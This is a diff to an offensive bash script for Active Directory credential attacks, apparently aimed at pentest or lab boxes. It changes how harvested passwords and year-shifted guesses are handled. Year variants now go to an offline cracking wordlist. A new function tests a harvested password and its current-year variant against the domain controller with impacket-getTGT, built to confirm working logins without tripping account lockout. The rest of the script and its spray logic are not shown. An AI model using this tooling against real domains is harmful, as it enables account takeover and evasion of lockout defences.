@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.21.0"
+readonly VERSION="1.21.1"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -344,19 +344,17 @@ add_secret() {
     FOUND_SECRETS["$p"]=1
     echo "$p" >>"$OUTDIR/found_passwords.txt"
     printf '%-30s  ⟵  %s\n' "$p" "$src" >>"$OUTDIR/credential_map.txt"
-    # If the secret embeds a year, expand sibling-year variants into the target
-    # wordlist so offline cracking + opt-in spray auto-adapt to the deployment
-    # year (boxes redeploy: Welcome2025! one season, Welcome2026! the next).
+    # If the secret embeds a year, expand sibling-year variants into the OFFLINE
+    # wordlist ONLY (hash cracking + opt-in --spray). They must NOT enter
+    # FOUND_SECRETS: that pool is sprayed ONLINE against every user every round,
+    # and year siblings are GUESSES (only one year is right) — spraying 4 wrong
+    # passwords/account is a fast track to ACCOUNT LOCKOUT (especially Protected
+    # Users). Online year-adaptation is handled, bounded, by _probe_year_password
+    # at harvest time against the specific account only.
     if [[ -n "${DOMAIN_WL:-}" && -f "${DOMAIN_WL:-/nonexistent}" ]]; then
         local v
         while IFS= read -r v; do
             [[ -z "$v" || "$v" == "$p" ]] && continue
-            if [[ -z "${FOUND_SECRETS[$v]:-}" ]]; then
-                FOUND_SECRETS["$v"]=1
-                echo "$v" >>"$OUTDIR/found_passwords.txt"
-                printf '%-30s  ⟵  year variant of %s\n' "$v" "$src" >>"$OUTDIR/credential_map.txt"
-                loot "Year-variant password candidate queued for spray → ${C_GREEN}$v${C_RESET}"
-            fi
             grep -qxF -- "$v" "$DOMAIN_WL" 2>/dev/null || echo "$v" >>"$DOMAIN_WL"
         done < <(year_variants "$p")
     fi
@@ -374,6 +372,32 @@ year_variants() {
     for ((y=now-3; y<=now+1; y++)); do
         echo "${s/$matched/$y}"
     done
+}
+
+# Deployment-year drift: a password harvested from a LOG often carries a stale
+# year (the log was written in 2025, but the box now runs the 2026 password).
+# Find the password that ACTUALLY authenticates WITHOUT locking the account:
+# try the literal first, then ONLY the current-year sibling — at most 2 online
+# getTGT attempts, stop at the first success. Echo the winner (empty if neither).
+# The wider ±window is never tried online (offline crack / --spray only).
+_probe_year_password() {            # <user> <literal_password>
+    local user="$1" lit="$2" cur cand cc winner=""
+    have impacket-getTGT || return 0
+    [[ -z "$DOMAIN" || -z "$DC_IP" ]] && return 0
+    cur=$(date +%Y)
+    local -a cands=("$lit")
+    if [[ "$lit" =~ (19|20)[0-9][0-9] ]]; then
+        local sib="${lit/$BASH_REMATCH/$cur}"
+        [[ "$sib" != "$lit" ]] && cands+=("$sib")
+    fi
+    for cand in "${cands[@]}"; do
+        cc="$(mktemp -u 2>/dev/null)"
+        if KRB5CCNAME="$cc" timeout 25 impacket-getTGT "${DOMAIN}/${user}:${cand}" -dc-ip "$DC_IP" >/dev/null 2>&1; then
+            winner="$cand"; rm -f "$cc" 2>/dev/null; break
+        fi
+        rm -f "$cc" 2>/dev/null
+    done
+    [[ -n "$winner" ]] && printf '%s\n' "$winner"
 }
 
 # Record a confirmed/working identity and how it was obtained (for the final map)
@@ -2962,11 +2986,21 @@ harvest_secrets() {
         _plausible_secret "$p"  || continue
         loot "★ Credential PAIR harvested from ${label}: ${C_GREEN}${C_BOLD}${u} : ${p}${C_RESET}"
         add_secret "$p" "harvested pair (user $u) from $label"
-        queue_cred "$u" "$p" "" "harvested cred pair from $label"
-        while IFS= read -r vp; do
-            [[ -z "$vp" || "$vp" == "$p" ]] && continue
-            queue_cred "$u" "$vp" "" "year variant of harvested cred pair"
-        done < <(year_variants "$p")
+        # Year-adaptation, lockout-safe: only probe an account we haven't already
+        # assessed/queued (so it runs ONCE, not every round). Try literal +
+        # current-year sibling (≤2 attempts), queue whichever authenticates.
+        if [[ -z "${SEEN_CREDS[${u,,}]:-}" ]]; then
+            local best; best="$(_probe_year_password "$u" "$p")"
+            if [[ -n "$best" && "$best" != "$p" ]]; then
+                add_secret "$best" "year-adapted cred pair from $label"
+                loot "★ Year-adapted: ${u} authenticates with ${C_GREEN}${C_BOLD}$best${C_RESET} (log carried a stale year)"
+                queue_cred "$u" "$best" "" "harvested cred pair (year-adapted) from $label"
+            else
+                queue_cred "$u" "$p" "" "harvested cred pair from $label"
+            fi
+        else
+            queue_cred "$u" "$p" "" "harvested cred pair from $label"
+        fi
         added=$((added+1))
     done < <(printf '%s\n' "$text" | grep -iE 'user|login|logon|account|acct|pass|pwd|secret|credential|principal|://|(^|[[:space:]])-[uUpP]([[:space:]]|$)' 2>/dev/null)
 
